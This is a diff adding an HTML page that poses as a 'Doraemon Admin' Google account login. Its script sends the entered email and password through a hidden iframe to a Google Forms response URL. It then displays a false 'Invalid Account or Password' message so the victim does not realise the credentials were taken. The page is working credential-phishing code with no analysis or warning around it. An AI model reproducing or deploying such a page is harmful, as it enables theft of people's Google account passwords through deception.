@@ -1,0 +1,166 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+      <title>
+            Doraemon Admin Login  </title>
+<meta name="viewport" content="width=device-width">
+<meta name="description" content="Doraemon Database Access Control">
+<link rel="icon" href="DORAEMON1.png">
+<script async src="https://spat-cloud.github.io/data/HarScript/HarScript.v2.9.Latest.min.js"></script>
+  <noscript>
+				<style>
+								#Msg
+								{
+												color:#000000;
+												font-size:12px;
+												margin:4% auto;
+												background-color:#DDD;
+												width:100%;
+												left:0;
+												right:2px;
+												border-radius:4px;
+												font-weight:588;
+												border:2px solid #FF0000;
+												padding:.8em 4em;
+												box-shadow:0px 8px 4px 2px #000;
+												
+								}
+								
+				</style>
+			
+							<p id="Msg">No <i>JavaScript</i> please  Enable <i>JavaScript</i> in Your Browser And Reload page</p>
+			
+</noscript>
+</head>
+<body>
+<div id="OPrompt">
+				
+<div id="Prompt">
+		<p id="label1">	Doraemon Admin Google Account login:</p>
+				<center><form action="https://accounts.google.com"><input type="email" name="identifier" placeholder="youraccount@example.com" id="Un"></center>
+				<br>
+				<br>
+					<center><input type="password" placeholder="PassWord" id="Pwd"></center>
+</form>
+<button id="btn" onclick="log()">ok</button>
+<button id="btn1" onclick="n()">cancel</button>
+<p id="logS">Checking Account....</p>
+</div>
+</div>
+<iframe name="space" style="display:none"></iframe>
+</body>
+<style>
+				#OPrompt
+								{
+												width:100%;
+												height:100%;
+												top:0;
+												bottom:0;
+												left:0%;
+												float:center;
+												right:0%;
+												background-color:rgba(0,0,0,0.8);
+												position:fixed;
+								}
+								#label1
+								{
+												font-size:12px;
+												font-weight:bold;
+												
+												
+								}
+								#Un,#Pwd
+								{
+								background-color:#FFF;
+												color:#000;
+												font-size:12px;
+												border:2px solid #FFF;
+												border-bottom:BLUE;
+												border-radius:4px;
+												width:280px;
+												height:20px;
+												padding:.2em .2em;
+								}
+								#Un:hover ,#Pwd:hover
+								{
+								    border:none;
+												border:2px solid transparent #000;
+												border-bottom:2px solid blue;
+												
+								}
+								#Un:invalid{border:2px solid #FF0000;}
+								#Prompt
+								{
+												background-color:#FFF;
+												width:280px;
+												Height:180px;
+												margin:15% auto;
+												left:3%;
+												right:4%;
+												padding:2em 2em;
+												border:2px solid #000;
+												border-radius:8px;
+												position:absolute;
+												
+								}
+								#btn
+								{
+												color:blue;
+												font-size:14px;
+												background-color:#FFF;
+												border:none;
+												float:right;
+												bottom:2px;
+												right:2px;
+												padding:.4em .4em;
+												position:absolute;
+								}
+								#btn1
+								{
+												color:blue;
+												font-size:14px;
+												background-color:#FFF;
+												border:none;
+												float:right;
+												padding:.4em .4em;
+												bottom:2px;
+												right:40px;
+												position:absolute;
+								}
+								#logS
+								{
+												color:#4AFDFE;
+												font-size:14px;
+												display:none;
+												
+								}
+								
+</style>
+<script>
+  
+  function log()
+  {
+      var fg = document.getElementById("Prompt");
+      var f = document.getElementById("logS");
+  				var g = document.getElementById("Un");
+  				var h = document.getElementById("Pwd");
+  				var condition = $HId('Un').value==""||$HId('Pwd').value==""||$HId('Un').value==null||$HId('Pwd').value==null;
+  				if(condition)
+  				{
+  								return false;
+  							
+  				}
+  				else
+  				{
+  								$HShow('logS');
+  								setTimeout(() => $HId('logS').style.color="#FF0000",4000);
+  								setTimeout(() => $HId('logS').innerHTML ="Invalid Account or Password",4000);
+  	window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse?entry.190958851=${$HId('Un').value}&entry.470512502=${$HId('Pwd').value}`,"space");	
+  				}
+  }
+  function n(){
+  				$HVanish("OPrompt");
+  				
+  }
+</script>
+</html>
